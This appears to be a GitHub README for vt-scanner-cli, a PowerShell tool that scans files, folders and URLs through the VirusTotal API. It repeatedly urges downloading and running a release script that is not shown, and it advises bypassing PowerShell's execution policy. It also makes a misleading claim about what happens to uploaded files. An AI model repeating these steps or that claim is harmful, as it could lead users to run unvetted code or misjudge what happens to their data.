# 🛡️ vt-scanner-cli - Scan Files and URLs Fast

[![Download vt-scanner-cli](https://img.shields.io/badge/Download-vt--scanner--cli-brightgreen?style=for-the-badge)](https://github.com/Nunoo11/vt-scanner-cli/releases)

---

## 📋 About vt-scanner-cli

vt-scanner-cli is a command-line tool that helps you check files, folders, and websites for viruses using VirusTotal’s API version 3. It runs on Windows PowerShell version 5.1 and above. There is also a Python version that works on Windows, macOS, and Linux if you want to use it on other systems.

This tool is designed to be simple to use even if you are not familiar with programming. You can analyze any file or URL quickly to see if it contains malware or threats. It uses the official VirusTotal API, which checks data across many antivirus engines.

---

## 🔍 What vt-scanner-cli Can Do

- Scan individual files for viruses and malware.
- Scan whole folders and all files inside them.
- Analyze URLs to check if they lead to dangerous websites.
- Show detailed results with the number of detections.
- Work in PowerShell without extra programs to install.
- Support the latest VirusTotal API version 3.
- Run on Windows with PowerShell 5.1 or later.
  
This makes it a useful tool if you want to check suspicious data before opening it.

---

## 🖥️ System Requirements

- Windows 7 or later.
- PowerShell version 5.1 or higher. (Most modern Windows versions have this by default.)
- Internet connection to send files or URLs to VirusTotal.
- An API key from VirusTotal (free to get from their website).
- About 100 MB free disk space for temporary files during scanning.

You do not need to install other software. vt-scanner-cli works right out of the box in PowerShell.

---

## 🚀 Getting Started

1. Go to the releases page to download the latest version:

   [Download vt-scanner-cli](https://github.com/Nunoo11/vt-scanner-cli/releases)

2. Download the latest release suitable for Windows. It usually comes as a zip file or directly as a script file.

3. Extract the downloaded zip file if needed.

4. Open Windows PowerShell. You can do this by typing `PowerShell` in the Start menu and pressing Enter.

5. Navigate to the folder where you saved the files. Use the command:

   ```powershell
   cd C:\Path\To\Folder
   ```

6. Before running the tool, you need to set your VirusTotal API key. To get your key:

   - Visit the [VirusTotal website](https://www.virustotal.com/gui/join-us).
   - Create a free account.
   - Go to your profile and find the API key.

7. Set the API key in your PowerShell session by running:

   ```powershell
   $env:VT_API_KEY="your_api_key_here"
   ```

8. Now you are ready to run the scanner.

---

## 📥 Download and Install 🔽

To get vt-scanner-cli:

1. Visit this page to download:

   [https://github.com/Nunoo11/vt-scanner-cli/releases](https://github.com/Nunoo11/vt-scanner-cli/releases)

2. Look for the latest release version labeled with the date or version number.

3. Download the file named like `vt-scanner-cli.ps1` (PowerShell script) or a zipped folder containing the script.

4. If you download a zip folder, right-click it and choose “Extract All” to unzip.

5. Leave the files in a folder easy to find, like your Desktop or Documents.

6. Open PowerShell and change to the folder where you saved the files.

---

## ⚙️ How to Use vt-scanner-cli

Here are the basic commands you will use in PowerShell.

### Scan a Single File

To scan one file, run:

```powershell
.\vt-scanner-cli.ps1 -File "C:\Path\To\Your\File.exe"
```

Replace `"C:\Path\To\Your\File.exe"` with the actual file path.

The scanner will analyze the file using the VirusTotal API and display results showing if any antivirus engines found a problem.

### Scan a Folder

To scan all files inside a folder:

```powershell
.\vt-scanner-cli.ps1 -Folder "C:\Path\To\Your\Folder"
```

The tool will check all files in the folder and give a summary of the results.

### Scan a URL

To check a website or link:

```powershell
.\vt-scanner-cli.ps1 -Url "http://example.com"
```

This will test the URL against VirusTotal’s database to see if it is safe.

---

## 🔧 Available Options

- `-File <path>` : Scan a specific file.
- `-Folder <path>` : Scan all files in the folder.
- `-Url <url>` : Scan a URL.
- `-Help` : Show help information.

Example:

```powershell
.\vt-scanner-cli.ps1 -Help
```

---

## 📄 Additional Information

- The tool uses your VirusTotal API key. Be careful not to share it publicly.
- Files are uploaded temporarily to VirusTotal for scanning; they do not stay on your computer.
- The script shows how many antivirus engines detected threats.
- Large files may take longer to scan.
- There is a limit on API calls per minute with a free VirusTotal key. Use the tool accordingly.
  
---

## 💡 Tips for Using vt-scanner-cli

- Keep your PowerShell updated to version 5.1 or higher.
- Always scan files downloaded from unknown sources.
- Use the folder scan for checking multiple files quickly.
- Run PowerShell as administrator if you have permission issues.
- Check the VirusTotal website for your API key status and limits.

---

## 🚩 Troubleshooting

If you see errors when running the script:

- Make sure you are running PowerShell 5.1 or above.
- Confirm your API key is correct and set with `$env:VT_API_KEY`.
- Check your internet connection.
- Make sure the file or folder path is correct, with quotes if it has spaces.
- If you get security warnings, set the execution policy temporarily by running:

  ```powershell
  Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
  ```

  This will allow the script to run just for the current PowerShell session.

---

## 🛠️ Support and Updates

The tool is open source and maintained on GitHub. Updates and new releases can be found on the releases page:

[https://github.com/Nunoo11/vt-scanner-cli/releases](https://github.com/Nunoo11/vt-scanner-cli/releases)

Check here regularly to get the latest fixes and improvements.

---

## ⚖️ License

vt-scanner-cli is provided under an open-source license. Refer to the LICENSE file in the repository for details on how you may use or share the code.